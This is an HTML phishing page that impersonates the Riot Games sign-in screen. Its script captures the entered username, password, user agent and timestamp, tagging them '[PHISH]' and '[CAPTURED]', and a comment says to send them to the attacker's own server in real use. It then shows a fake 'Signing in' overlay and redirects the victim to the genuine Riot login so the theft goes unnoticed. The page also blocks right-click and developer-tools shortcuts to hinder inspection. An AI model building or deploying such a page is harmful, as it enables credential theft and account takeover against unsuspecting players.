<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In – Riot Games</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background: linear-gradient(135deg, #1a0b2e 0%, #0d1b3e 50%, #1a0f3c 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
        }

        /* Background character overlays */
        .bg-left {
            position: fixed;
            left: 0;
            bottom: 0;
            width: 45%;
            height: 100%;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 800"><defs><linearGradient id="g" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:%2300d4ff;stop-opacity:0.3"/><stop offset="100%" style="stop-color:%23ff006e;stop-opacity:0.1"/></linearGradient></defs><ellipse cx="200" cy="400" rx="180" ry="350" fill="url(%23g)"/></svg>') no-repeat bottom left;
            background-size: contain;
            opacity: 0.6;
            pointer-events: none;
            z-index: 0;
        }

        .bg-right {
            position: fixed;
            right: 0;
            bottom: 0;
            width: 50%;
            height: 100%;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 800"><defs><linearGradient id="b" x1="100%" y1="0%" x2="0%" y2="100%"><stop offset="0%" style="stop-color:%2300a8ff;stop-opacity:0.4"/><stop offset="50%" style="stop-color:%230d1b3e;stop-opacity:0.2"/><stop offset="100%" style="stop-color:%230d1b3e;stop-opacity:0"/></linearGradient></defs><path d="M500 0 L500 800 L200 800 Q300 400 500 0Z" fill="url(%23b)"/></svg>') no-repeat bottom right;
            background-size: contain;
            opacity: 0.8;
            pointer-events: none;
            z-index: 0;
        }

        /* Riot Logo */
        .riot-logo {
            position: fixed;
            top: 40px;
            left: 40px;
            z-index: 10;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .riot-logo svg {
            width: 32px;
            height: 32px;
        }

        .riot-logo span {
            color: #fff;
            font-size: 18px;
            font-weight: 800;
            letter-spacing: 1px;
            text-transform: uppercase;
        }

        /* Main Card */
        .login-card {
            background: #ffffff;
            width: 100%;
            max-width: 450px;
            padding: 60px 48px 40px;
            border-radius: 0;
            box-shadow: 0 25px 80px rgba(0, 0, 0, 0.4);
            position: relative;
            z-index: 5;
            animation: slideUp 0.5s ease-out;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        h1 {
            text-align: center;
            font-size: 24px;
            font-weight: 700;
            color: #111;
            margin-bottom: 40px;
            letter-spacing: -0.5px;
        }

        /* Input Fields */
        .input-group {
            margin-bottom: 16px;
            position: relative;
        }

        .input-group label {
            display: block;
            font-size: 10px;
            font-weight: 700;
            color: #999;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            margin-bottom: 8px;
            transition: color 0.2s;
        }

        .input-group input {
            width: 100%;
            padding: 14px 16px;
            border: none;
            border-radius: 4px;
            background: #f3f3f3;
            font-size: 14px;
            color: #111;
            transition: background 0.2s, box-shadow 0.2s;
            outline: none;
        }

        .input-group input:focus {
            background: #e8e8e8;
            box-shadow: 0 0 0 2px rgba(0, 0, 0, 0.05);
        }

        .input-group input::placeholder {
            color: #aaa;
        }

        /* Social Login Buttons */
        .social-login {
            display: flex;
            gap: 10px;
            margin: 28px 0;
            justify-content: center;
        }

        .social-btn {
            flex: 1;
            height: 42px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: transform 0.15s, opacity 0.15s;
            position: relative;
            overflow: hidden;
        }

        .social-btn:hover {
            transform: translateY(-2px);
            opacity: 0.9;
        }

        .social-btn:active {
            transform: translateY(0);
        }

        .social-btn.facebook {
            background: #1877f2;
        }

        .social-btn.google {
            background: #fff;
            border: 1px solid #ddd;
        }

        .social-btn.apple {
            background: #000;
        }

        .social-btn.xbox {
            background: #107c10;
        }

        .social-btn.playstation {
            background: #00439c;
        }

        .social-btn svg {
            width: 20px;
            height: 20px;
        }

        /* Checkbox */
        .checkbox-wrapper {
            display: flex;
            align-items: center;
            gap: 10px;
            margin: 20px 0 30px;
        }

        .checkbox-wrapper input[type="checkbox"] {
            width: 18px;
            height: 18px;
            accent-color: #d13639;
            cursor: pointer;
        }

        .checkbox-wrapper label {
            font-size: 13px;
            color: #555;
            cursor: pointer;
            user-select: none;
        }

        /* Submit Button */
        .submit-btn {
            width: 64px;
            height: 64px;
            border-radius: 50%;
            border: 2px solid #e0e0e0;
            background: transparent;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 30px;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
        }

        .submit-btn:hover {
            border-color: #d13639;
            background: rgba(209, 54, 57, 0.05);
        }

        .submit-btn:hover svg {
            transform: translateX(3px);
            stroke: #d13639;
        }

        .submit-btn:active {
            transform: scale(0.95);
        }

        .submit-btn svg {
            width: 24px;
            height: 24px;
            stroke: #ccc;
            stroke-width: 2;
            fill: none;
            transition: all 0.2s;
        }

        .submit-btn.loading {
            pointer-events: none;
        }

        .submit-btn.loading::after {
            content: '';
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 2px solid transparent;
            border-top-color: #d13639;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Links */
        .links {
            text-align: center;
        }

        .links a {
            display: block;
            color: #666;
            text-decoration: none;
            font-size: 11px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            margin: 12px 0;
            transition: color 0.2s;
        }

        .links a:hover {
            color: #d13639;
        }

        /* Footer */
        .footer {
            position: fixed;
            bottom: 20px;
            left: 0;
            right: 0;
            text-align: center;
            z-index: 10;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 20px;
            flex-wrap: wrap;
            padding: 0 20px;
        }

        .footer a {
            color: rgba(255, 255, 255, 0.5);
            text-decoration: none;
            font-size: 10px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: color 0.2s;
        }

        .footer a:hover {
            color: rgba(255, 255, 255, 0.9);
        }

        .footer .lang {
            display: flex;
            align-items: center;
            gap: 6px;
            color: rgba(255, 255, 255, 0.5);
            font-size: 10px;
            font-weight: 600;
            cursor: pointer;
        }

        .footer-bottom {
            position: fixed;
            bottom: 5px;
            left: 0;
            right: 0;
            text-align: center;
            color: rgba(255, 255, 255, 0.3);
            font-size: 9px;
            z-index: 10;
        }

        .footer-bottom a {
            color: rgba(255, 255, 255, 0.5);
            text-decoration: none;
        }

        /* Error Message */
        .error-msg {
            background: #ffebee;
            color: #c62828;
            padding: 12px 16px;
            border-radius: 4px;
            font-size: 13px;
            margin-bottom: 16px;
            display: none;
            align-items: center;
            gap: 8px;
        }

        .error-msg.show {
            display: flex;
        }

        /* Responsive */
        @media (max-width: 520px) {
            .login-card {
                margin: 20px;
                padding: 40px 28px 30px;
            }
            
            .riot-logo {
                top: 20px;
                left: 20px;
            }
            
            .social-login {
                flex-wrap: wrap;
            }
            
            .social-btn {
                flex: 0 0 calc(20% - 8px);
                min-width: 50px;
            }
        }

        /* Success overlay */
        .success-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(13, 27, 62, 0.95);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 100;
            flex-direction: column;
            gap: 20px;
        }

        .success-overlay.show {
            display: flex;
            animation: fadeIn 0.4s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .success-overlay h2 {
            color: #fff;
            font-size: 20px;
            font-weight: 600;
        }

        .success-overlay p {
            color: rgba(255,255,255,0.6);
            font-size: 14px;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid rgba(255,255,255,0.1);
            border-top-color: #d13639;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
    </style>
</head>
<body>

    <!-- Background elements -->
    <div class="bg-left"></div>
    <div class="bg-right"></div>

    <!-- Riot Logo -->
    <div class="riot-logo">
        <svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
            <rect width="32" height="32" rx="4" fill="white"/>
            <path d="M8 8h6v16H8V8zm10 0h6v16h-6V8z" fill="#d13639"/>
            <rect x="14" y="12" width="4" height="8" fill="#d13639"/>
        </svg>
        <span>Riot Games</span>
    </div>

    <!-- Login Card -->
    <div class="login-card">
        <h1>Sign in</h1>

        <div class="error-msg" id="errorMsg">
            <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-width="1.5"/>
                <path d="M8 4v5M8 11h.01" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
            </svg>
            <span>Incorrect username or password.</span>
        </div>

        <form id="loginForm" autocomplete="off">
            <div class="input-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" placeholder="Enter your username" required>
            </div>

            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>

            <div class="social-login">
                <button type="button" class="social-btn facebook" title="Facebook">
                    <svg viewBox="0 0 24 24" fill="white">
                        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                    </svg>
                </button>
                <button type="button" class="social-btn google" title="Google">
                    <svg viewBox="0 0 24 24" width="20" height="20">
                        <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
                        <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                        <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
                        <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
                    </svg>
                </button>
                <button type="button" class="social-btn apple" title="Apple">
                    <svg viewBox="0 0 24 24" fill="white" width="18" height="18">
                        <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.61 2.71-2.68 4.7-2.68 1.4 0 2.63.88 3.44.88.8 0 2.29-1.05 3.8-.9.65.03 2.48.26 3.65 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
                    </svg>
                </button>
                <button type="button" class="social-btn xbox" title="Xbox">
                    <svg viewBox="0 0 24 24" fill="white" width="18" height="18">
                        <path d="M4.102 21.033C6.211 22.881 8.977 24 12 24c3.026 0 5.789-1.119 7.902-2.967 1.877-1.912-4.316-8.709-7.902-11.417-3.582 2.708-9.779 9.505-7.898 11.417zm11.16-14.406c2.5 2.961 7.484 4.785 7.48 4.773.006-.006.009-.039.009-.039C22.855 5.653 17.739 0 12 0 6.26 0 1.145 5.653.249 11.361c0 0 .003.033.009.039 0 .012 4.98-1.812 7.48-4.773 0 0-1.646 3.879-2.437 5.58 1.332.719 3.269 1.593 5.199 1.593 1.933 0 3.867-.874 5.199-1.593-.791-1.701-2.437-5.58-2.437-5.58z"/>
                    </svg>
                </button>
                <button type="button" class="social-btn playstation" title="PlayStation">
                    <svg viewBox="0 0 24 24" fill="white" width="18" height="18">
                        <path d="M9.5 4.27v15.46c0 .47-.2.67-.5.67-.2 0-.4-.1-.6-.2L6.5 18.87V6.13l2.9-1.33c.4-.2.6-.1.6.2v-.73h-.5zm7.5.8v4.13l-2.5-1.13V5.07c0-.67-.5-1.07-1.2-1.07-.6 0-1.2.27-1.8.67l-4.5 2.6v10.46l2.5 1.47V8.33l2.5-1.47c.2-.13.4-.2.6-.2.3 0 .4.2.4.53v9.87c0 1.33.8 1.87 1.8 1.87.8 0 1.6-.33 2.3-.8l2.5-1.47V6.67l-2.5 1.47v-2.8c0-.2-.2-.4-.4-.4s-.3.07-.4.13z"/>
                    </svg>
                </button>
            </div>

            <div class="checkbox-wrapper">
                <input type="checkbox" id="staySignedIn" name="staySignedIn">
                <label for="staySignedIn">Stay signed in</label>
            </div>

            <button type="submit" class="submit-btn" id="submitBtn">
                <svg viewBox="0 0 24 24">
                    <path d="M5 12h14M12 5l7 7-7 7"/>
                </svg>
            </button>
        </form>

        <div class="links">
            <a href="#">Can't sign in?</a>
            <a href="#">Create account</a>
        </div>
    </div>

    <!-- Footer -->
    <div class="footer">
        <a href="#">Support</a>
        <a href="#">Privacy Notice</a>
        <a href="#">Terms of Service</a>
        <a href="#">Cookie Preferences</a>
        <div class="lang">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <circle cx="12" cy="12" r="10"/>
                <path d="M2 12h20M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>
            </svg>
            EN
        </div>
    </div>

    <div class="footer-bottom">
        This site is protected by hCaptcha and its <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a> apply.
    </div>

    <!-- Success Overlay -->
    <div class="success-overlay" id="successOverlay">
        <div class="spinner"></div>
        <h2>Signing in...</h2>
        <p>Please wait while we verify your credentials.</p>
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const submitBtn = document.getElementById('submitBtn');
        const errorMsg = document.getElementById('errorMsg');
        const successOverlay = document.getElementById('successOverlay');

        // Social button handlers (fake redirects)
        document.querySelectorAll('.social-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                const platform = this.title;
                console.log(`[PHISH] Social login clicked: ${platform}`);
                // You can redirect to real OAuth here to look more legit
            });
        });

        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const staySignedIn = document.getElementById('staySignedIn').checked;

            // Hide any previous error
            errorMsg.classList.remove('show');

            // Show loading state
            submitBtn.classList.add('loading');

            // Log the captured credentials (in real use, send to your server)
            const capturedData = {
                username: username,
                password: password,
                staySignedIn: staySignedIn,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: 'Riot Games'
            };

            console.log('[CAPTURED]', capturedData);

            // Simulate network delay then show "error" (keeps them trying or redirects)
            setTimeout(() => {
                submitBtn.classList.remove('loading');
                
                
                 // Option B: Show fake success overlay then redirect
                 successOverlay.classList.add('show');
                 setTimeout(() => {
                     window.location.href = 'https://authenticate.riotgames.com';
                 }, 2000);

            }, 1500);
        });

        // Prevent right-click (optional, adds slight friction)
        document.addEventListener('contextmenu', e => e.preventDefault());

        // Block common dev tools keys (optional)
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
                e.preventDefault();
            }
        });
    </script>
</body>
</html>
